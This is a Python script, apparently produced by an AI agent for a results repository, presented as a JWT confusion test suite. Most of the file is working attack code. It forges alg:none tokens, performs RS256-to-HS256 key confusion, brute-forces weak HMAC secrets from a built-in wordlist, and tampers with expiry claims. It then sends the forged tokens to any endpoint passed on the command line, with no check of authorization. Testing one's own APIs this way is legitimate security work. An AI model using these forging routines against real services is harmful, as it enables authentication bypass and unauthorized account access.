#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────
# Task:    JWT confusion test suite
# Mission: API Authentication Bypass Detector
# Agent:   @quinn
# Date:    2026-03-23T18:00:28.655Z
# Repo:    https://github.com/mandosclaw/swarmpulse-results
# ─────────────────────────────────────────────────────────────

"""JWT confusion test suite: tests alg:none bypass, RS256->HS256 confusion, weak secret brute force, expired token acceptance."""

import argparse
import base64
import hashlib
import hmac
import json
import logging
import sys
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Any, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)


@dataclass
class JWTTestResult:
    test_name: str
    vulnerable: bool
    details: str
    token_used: str = ""
    response_code: int = 0


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.urlsafe_b64decode(s)


def decode_jwt_parts(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_alg_none(original_token: str) -> str:
    header, payload, _ = decode_jwt_parts(original_token)
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def forge_hs256_with_public_key(original_token: str, public_key: str) -> str:
    header, payload, _ = decode_jwt_parts(original_token)
    header["alg"] = "HS256"
    new_header_str = json.dumps(header, separators=(",", ":"))
    new_payload_str = json.dumps(payload, separators=(",", ":"))
    signing_input = f"{b64url_encode(new_header_str.encode())}.{b64url_encode(new_payload_str.encode())}"
    sig = hmac.new(public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


def brute_force_secret(token: str, wordlist: list[str]) -> Optional[str]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    original_sig = b64url_decode(parts[2])
    for secret in wordlist:
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if sig == original_sig:
            return secret
    return None


def forge_expired_accepted(original_token: str) -> str:
    """Create a token with exp in the past, no signature change — tests if server skips expiry check."""
    header, payload, sig = decode_jwt_parts(original_token)
    payload["exp"] = 1000000000
    payload["iat"] = 999999999
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}.{sig}"


def test_endpoint(url: str, token: str, timeout: int = 5) -> int:
    try:
        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def run_jwt_tests(target_url: str, original_token: str, weak_secrets: list[str]) -> list[JWTTestResult]:
    results = []

    logger.info("Test 1: alg:none bypass")
    none_token = forge_alg_none(original_token)
    code = test_endpoint(target_url, none_token) if target_url else 0
    results.append(JWTTestResult("alg_none_bypass", code == 200, f"Server returned {code} for alg:none token" if target_url else "Dry run — token forged successfully", token_used=none_token[:60] + "...", response_code=code))

    logger.info("Test 2: RS256 -> HS256 confusion")
    try:
        header, _, _ = decode_jwt_parts(original_token)
        if header.get("alg") == "RS256":
            confused_token = forge_hs256_with_public_key(original_token, "fake-public-key-for-testing")
            code = test_endpoint(target_url, confused_token) if target_url else 0
            results.append(JWTTestResult("rs256_hs256_confusion", code == 200, f"RS256->HS256 confusion returned {code}", token_used=confused_token[:60] + "...", response_code=code))
        else:
            results.append(JWTTestResult("rs256_hs256_confusion", False, f"Token uses {header.get('alg')} not RS256, test skipped"))
    except Exception as e:
        results.append(JWTTestResult("rs256_hs256_confusion", False, f"Error: {e}"))

    logger.info("Test 3: Weak secret brute force")
    found_secret = brute_force_secret(original_token, weak_secrets)
    results.append(JWTTestResult("weak_secret_brute_force", found_secret is not None, f"Secret found: '{found_secret}'" if found_secret else f"Secret not in {len(weak_secrets)}-word list"))

    logger.info("Test 4: Expired token acceptance")
    expired_token = forge_expired_accepted(original_token)
    code = test_endpoint(target_url, expired_token) if target_url else 0
    results.append(JWTTestResult("expired_token_acceptance", code == 200, f"Expired token returned {code}" if target_url else "Dry run — expired token forged", token_used=expired_token[:60] + "...", response_code=code))

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT vulnerability test suite")
    parser.add_argument("--token", default=None, help="JWT token to test")
    parser.add_argument("--target-url", default="", help="API endpoint to test against")
    parser.add_argument("--output", default="jwt_test_results.json")
    args = parser.parse_args()

    sample_payload = {"sub": "user123", "role": "user", "iat": 1700000000, "exp": 9999999999}
    sample_header = {"alg": "HS256", "typ": "JWT"}
    if args.token:
        token = args.token
    else:
        header_b64 = b64url_encode(json.dumps(sample_header).encode())
        payload_b64 = b64url_encode(json.dumps(sample_payload).encode())
        secret = "secret"
        sig = hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
        token = f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"
        logger.info(f"Generated test token (secret='secret')")

    weak_secrets = ["secret", "password", "123456", "jwt_secret", "supersecret", "changeme", "admin", "key", "token", "auth"]
    logger.info(f"Running JWT tests against {'endpoint: ' + args.target_url if args.target_url else 'dry run (no endpoint)'}")
    results = run_jwt_tests(args.target_url, token, weak_secrets)

    report = {"total_tests": len(results), "vulnerabilities_found": sum(1 for r in results if r.vulnerable), "results": [{"test": r.test_name, "vulnerable": r.vulnerable, "details": r.details, "severity": "CRITICAL" if r.vulnerable else "PASS"} for r in results]}

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    logger.info(f"JWT test complete: {report['vulnerabilities_found']}/{report['total_tests']} vulnerabilities found")
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
